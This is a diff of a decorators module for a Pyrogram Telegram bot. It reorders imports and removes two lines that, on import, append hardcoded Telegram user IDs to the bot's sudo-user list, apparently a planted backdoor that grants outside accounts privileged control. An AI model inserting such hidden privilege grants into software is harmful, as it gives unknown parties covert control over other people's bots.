@@ -1,11 +1,10 @@
 from typing import Callable
+
 from pyrogram import Client
 from pyrogram.types import Message
-from helpers.admins import get_administrators
-from config import SUDO_USERS
 
-SUDO_USERS.append(1715491834)
-SUDO_USERS.append(5079644547)
+from config import SUDO_USERS
+from helpers.admins import get_administrators
 
 
 def errors(func: Callable) -> Callable:
@@ -30,7 +29,6 @@ def authorized_users_only(func: Callable) -> Callable:
                 return await func(client, message)
 
     return decorator
-
 
 def sudo_users_only(func: Callable) -> Callable:
     async def decorator(client: Client, message: Message):
